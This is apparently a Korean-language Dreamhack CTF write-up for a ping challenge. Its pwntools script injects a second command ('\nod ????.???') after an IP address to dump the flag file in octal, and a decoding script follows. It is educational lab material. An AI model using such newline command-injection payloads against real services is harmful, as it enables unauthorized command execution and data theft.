---
title: "[DREAMHACK] GamGyul Ping writeup"
date: 2026-01-12 13:28:50
categories: Essay
tags: [writeup]
---

# first try:
```python
from pwn import *

context.binary = elf = ELF('./main')
context.arch = "amd64"
context.log_level = "debug"

HOST, PORT = "host3.dreamhack.games 22393".split()

if args.REMOTE:
    p = remote(HOST, PORT)
elif args.DOCKER:
    p = remote('localhost', 5000)
else:
    p = process()

p.sendline(b'127.0.0.1\nod ????.???')

p.interactive()
```

more가 있는 건 알았지만 시력 이슈로 e가 필터링 됐다고 판단해버리는 바람에...
od를 사용해서 풀었습니다.

...정규식을 사용해서 `0o`로 시작하는 8진수들을 추출하여 리스트를 만들고
각 리스트 원소를 순회하며 상위 바이트와 하위 바이트의 위치를 바꿔 `little-endian`으로 배치 해준 뒤, 출력하게 했습니다. 

엔드 연산자 안 먹어서 바로 명령어 찾다가 od로 간 게 참 바보같은...
<!--more-->
```python
from pwn import *

context.binary = elf = ELF('./main')
context.arch = "amd64"
context.log_level = "debug"

HOST, PORT = "host3.dreamhack.games 22393".split()

if args.REMOTE:
    p = remote(HOST, PORT)
elif args.DOCKER:
    p = remote('localhost', 5000)
else:
    p = process()

p.sendline(b'127.0.0.1\nod ????.???')

# 알고리즘 실력이 후달리는 관계로 수동 리스트 완성...했다가 정규식으로 구하는 코드를 뒤늦게 작성
list = [
    0o030502, 0o032116, 0o054522, 0o054573, 0o072460, 0o041537, 0o072064, 0o064143,
    0o062063, 0o043537, 0o066541, 0o074507, 0o066165, 0o052137, 0o067151, 0o057571,
    0o064520, 0o063556, 0o006575, 0o000012
]

result = b''
for i in list:
    byte1 = i & 0xff
    byte2 = (i >> 8) & 0xff
    result += bytes([byte1, byte2])

print(result)
print(result.decode('ascii', errors='ignore'))
```